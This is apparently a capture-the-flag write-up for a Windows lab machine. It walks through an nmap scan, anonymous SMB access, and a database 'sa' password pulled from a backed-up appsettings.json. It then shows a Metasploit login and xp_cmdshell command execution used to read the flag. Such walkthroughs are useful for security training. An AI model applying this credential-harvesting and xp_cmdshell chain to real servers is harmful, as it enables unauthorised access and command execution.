
## Writeup

I started by portscanning the box with nmap to map out what ports/services where exposed. From the challenge description we can tell that its Windows because of the format of the filepath to the flag, i therefore set the `-Pn` to skip host discovery, which tells nmap to assume that the host is up, because Windows machines typically block things like ICMP echo requests (ping) and small TCP probes that are used during host discovery.  

```
nmap -A -p- -Pn -T4 10.128.3.119
```

I got the following output from nmap:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 11:57 CET
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 92.67% done; ETC: 11:57 (0:00:00 remaining)
Stats: 0:00:48 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.88% done; ETC: 11:58 (0:00:00 remaining)
Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.90% done; ETC: 11:58 (0:00:00 remaining)
Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.90% done; ETC: 11:58 (0:00:00 remaining)
Nmap scan report for 10.128.3.119
Host is up (0.062s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Potato Head, Sandnes
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.4200.00; CU11+
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-11-08T10:58:37+00:00; 0s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-08T10:57:07
|_Not valid after:  2055-11-08T10:57:07
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: POTATOHEAD
|   NetBIOS_Domain_Name: POTATOHEAD
|   NetBIOS_Computer_Name: POTATOHEAD
|   DNS_Domain_Name: PotatoHead
|   DNS_Computer_Name: PotatoHead
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-08T10:57:56+00:00
|_ssl-date: 2025-11-08T10:58:37+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=PotatoHead
| Not valid before: 2025-08-05T06:22:53
|_Not valid after:  2026-02-04T06:22:53
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: POTATOHEAD, NetBIOS user: <unknown>, NetBIOS MAC: 02:0b:dd:e0:19:eb (unknown)
| smb2-time: 
|   date: 2025-11-08T10:57:56
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.17 seconds
```

From the output this looked like a Windows Server. I saw that 445 (SMB) was open, and checked wether anonymous access to smb shares were allowed with smbclient. `-L` is used for listing available shares on the host and `-N` makes smbclient supress the password prompt and assume that no password is required. 

```
smbclient -L //10.128.3.119/ -N 
```

```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backup          Disk      Backup Share
	C$              Disk      Default share
	E$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available

```

It was. From this i see the Backup share. I connect to it as follows

```
smbclient //10.128.3.119/Backup -N
```

and list the contents of the share. From this I saw that it contained a zip file called inetpub.zip . inetpub is a default folder created by Microsoft Internet Information Services (IIS), which is the built-in web server for Windows. It holds website content, web applications and their configuration files. 

```
Try "help" to get a list of possible commands.
smb: \> ls
  $RECYCLE.BIN                      DHS        0  Mon Aug  4 13:30:22 2025
  inetpub.zip                         A 30882467  Fri Nov  7 13:04:46 2025
  System Volume Information         DHS        0  Tue Aug  5 13:42:00 2025

		2808063 blocks of size 4096. 2791470 blocks available
smb: \> get inetpub.zip
getting file \inetpub.zip of size 30882467 as inetpub.zip (3215.6 KiloBytes/sec) (average 3215.6 KiloBytes/sec)
smb: \> 

```

I retrieved the zipfile, and inspected its contents. There were a lot of config files and a non standard directory called `potatohead` . Inside the `potatohead` directory i found the file `appsettings.json` . It contained the following:

```
{
  "ConnectionStrings": {
    "DefaultConnection": "Server=localhost;Database=BeachClubDb;User Id=sa;Password=RLFXT0PpAtk2IAyB1xKnuaFaqDX;TrustServerCertificate=True;"
  },
  "Logging": {
    "LogLevel": {
      "Default": "Information",
      "Microsoft.AspNetCore": "Warning"
    }
  },
  "AllowedHosts": "*"
}
```

This was most likely credentials for the mssql service that ran on port 1433. From this i used the mssql_login module in msf with the following settings:

![mssql_login](Pasted%20image%2020251110222203.png)

I ran the module and i got a session to the database

![successful_login_to_mssql](Pasted%20image%2020251110221509.png)

From this i could interact with the database through queries. After being able to interact with the database i checked if [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17) was enabled, which would allow us to spawn a Windows command shell and pass in a string for execution. The process spawned by xp_cmdshell has the same security rights as the SQL Server service account, meaning that we could run commands as `nt service\mssqlserver` . To check if xp_cmdshell was enabled i used the session we got from mssql_login with the mssql_exec module. This module checks if xp_cmdshell is enabled, and tries to enable it if it isnt. 

![test_of_xp_cmdshell_1](Pasted%20image%2020251110221703.png)
![test_of_xp_cmdshell_2](Pasted%20image%2020251110221814.png)

You could also have manually enumerated the database to figure this out like this:

```
-- CHECK FOR "xp_cmdshell"
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured 
FROM sys.configurations 
WHERE name = 'xp_cmdshell';

-- CHECK FOR "show advanced options"
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured 
FROM sys.configurations 
WHERE name = 'show advanced options';

-- CHECK FOR "Agent XPs"
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured
FROM sys.configurations 
WHERE name = 'Agent XPs';
```

From mssql_exec we see that xp_cmdshell is enabled and we have CE as `nt service\mssqlserver` . I used this to read the flag in 
`C:\Users\Public\flag.txt`

![read_flag](Pasted%20image%2020251110221907.png)

#### Flag: EPT{sei_sandnes_e_stabilt!}
